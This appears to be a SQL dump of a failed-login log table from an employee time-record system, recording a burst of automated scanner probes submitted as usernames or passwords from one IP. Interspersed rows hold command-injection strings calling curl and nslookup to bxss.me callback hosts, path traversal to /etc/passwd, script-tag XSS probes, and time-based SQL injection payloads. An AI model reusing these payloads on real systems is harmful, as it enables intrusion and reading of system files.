INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('326', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('327', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: |echo omoarq$()\\ pacina\\nz^xyu||a #\' |echo omoarq$()\\ pacina\\nz^xyu||a #|\" |echo omoarq$()\\ pacina\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('328', '', '2023-05-08 03:41:19', '', 'Invalid username/password. Tried with: (nslookup -q=cname hitauiqhowxbva4fa5.bxss.me||curl hitauiqhowxbva4fa5.bxss.me))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('329', '', '2023-05-08 03:41:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('330', '', '2023-05-08 03:41:19', '', 'Invalid username/password. Tried with: $(nslookup -q=cname hitcwtdpagyzpb8396.bxss.me||curl hitcwtdpagyzpb8396.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('331', '', '2023-05-08 03:41:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('332', '', '2023-05-08 03:41:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('333', '', '2023-05-08 03:41:19', '', 'Invalid username/password. Tried with: &nslookup -q=cname hitolxpywdlrbcface.bxss.me&\'\\\"`0&nslookup -q=cname hitolxpywdlrbcface.bxss.me&`\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('334', '', '2023-05-08 03:41:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('335', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('336', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: &(nslookup -q=cname hitnwmlzktctk55c63.bxss.me||curl hitnwmlzktctk55c63.bxss.me)&\'\\\"`0&(nslookup -q=cname hitnw', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('337', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('338', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('339', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: |(nslookup -q=cname hitygtvtyrtix4d10d.bxss.me||curl hitygtvtyrtix4d10d.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('340', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('341', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: `(nslookup -q=cname hitkxqtnzcdle8da45.bxss.me||curl hitkxqtnzcdle8da45.bxss.me)`', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('342', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('343', '', '2023-05-08 03:41:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('344', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: ;(nslookup -q=cname hittsfotuvxrx2bfd3.bxss.me||curl hittsfotuvxrx2bfd3.bxss.me)|(nslookup -q=cname hittsfotuvx', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('345', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('346', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('347', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('348', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('349', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('350', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('351', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('352', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('353', '', '2023-05-08 03:41:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('354', '', '2023-05-08 03:41:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('355', '', '2023-05-08 03:41:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('356', '', '2023-05-08 03:41:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('357', '', '2023-05-08 03:41:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('358', '', '2023-05-08 03:41:22', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('359', '', '2023-05-08 03:41:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('360', '', '2023-05-08 03:41:22', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('361', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: file:///etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('362', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('363', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('364', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('365', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('366', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('367', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: ../RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('368', '', '2023-05-08 03:41:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('369', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('370', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('371', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('372', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('373', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('374', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('375', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('376', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: xfs.bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('377', '', '2023-05-08 03:41:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('378', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('379', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('380', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: RDFYjolf\'\"()&%<zzz><ScRiPt >YFBb(9855)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('381', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('382', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('383', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: \'\"()&%<zzz><ScRiPt >YFBb(9606)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('384', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('385', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: \'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('386', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('387', '', '2023-05-08 03:41:25', '', 'Invalid username/password. Tried with: RDFYjolf9215892', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('388', '', '2023-05-08 03:41:26', '', 'Invalid username/password. Tried with: <!--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('389', '', '2023-05-08 03:41:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('390', '', '2023-05-08 03:41:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('391', '', '2023-05-08 03:41:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('392', '', '2023-05-08 03:41:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('393', '', '2023-05-08 03:41:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('394', '', '2023-05-08 03:41:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('395', '', '2023-05-08 03:41:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('396', '', '2023-05-08 03:41:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('397', '', '2023-05-08 03:41:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('398', '', '2023-05-08 03:41:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('399', '', '2023-05-08 03:41:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('400', '', '2023-05-08 03:41:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('401', '', '2023-05-08 03:41:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('402', '', '2023-05-08 03:41:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('403', '', '2023-05-08 03:41:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('404', '', '2023-05-08 03:41:33', '', 'Invalid username/password. Tried with: Kszlj8Ul', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('405', '', '2023-05-08 03:41:33', '', 'Invalid username/password. Tried with: -1 OR 2+510-510-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('406', '', '2023-05-08 03:41:34', '', 'Invalid username/password. Tried with: -1 OR 2+641-641-1=0+0+0+1', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('407', '', '2023-05-08 03:41:34', '', 'Invalid username/password. Tried with: -1\' OR 2+480-480-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('408', '', '2023-05-08 03:41:34', '', 'Invalid username/password. Tried with: -1\' OR 2+407-407-1=0+0+0+1 or \'wTQZkEGY\'=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('409', '', '2023-05-08 03:41:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('410', '', '2023-05-08 03:41:35', '', 'Invalid username/password. Tried with: -1\" OR 2+504-504-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('411', '', '2023-05-08 03:41:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('412', '', '2023-05-08 03:41:36', '', 'Invalid username/password. Tried with: if(now()=sysdate(),sleep(15),0)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('413', '', '2023-05-08 03:41:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('414', '', '2023-05-08 03:41:38', '', 'Invalid username/password. Tried with: 0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('415', '', '2023-05-08 03:41:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('416', '', '2023-05-08 03:41:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('417', '', '2023-05-08 03:41:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('418', '', '2023-05-08 03:41:39', '', 'Invalid username/password. Tried with: 0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('419', '', '2023-05-08 03:41:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('420', '', '2023-05-08 03:41:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('421', '', '2023-05-08 03:41:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('422', '', '2023-05-08 03:41:41', '', 'Invalid username/password. Tried with: (select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('423', '', '2023-05-08 03:41:41', '', 'Invalid username/password. Tried with: ${9999543+9999478}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('424', '', '2023-05-08 03:41:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('425', '', '2023-05-08 03:41:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('426', '', '2023-05-08 03:41:42', '', 'Invalid username/password. Tried with: response.write(9786400*9509164)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('427', '', '2023-05-08 03:41:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('428', '', '2023-05-08 03:41:42', '', 'Invalid username/password. Tried with: \'+response.write(9786400*9509164)+\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('429', '', '2023-05-08 03:41:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('430', '', '2023-05-08 03:41:42', '', 'Invalid username/password. Tried with: \"+response.write(9786400*9509164)+\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('431', '', '2023-05-08 03:41:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('432', '', '2023-05-08 03:41:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('433', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('434', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('435', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('436', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('437', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('438', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: 1 waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('439', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('440', '', '2023-05-08 03:41:43', '', 'Invalid username/password. Tried with: cmVNUnRyMEM=', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('441', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('442', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('443', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('444', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('445', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('446', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('447', '', '2023-05-08 03:41:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
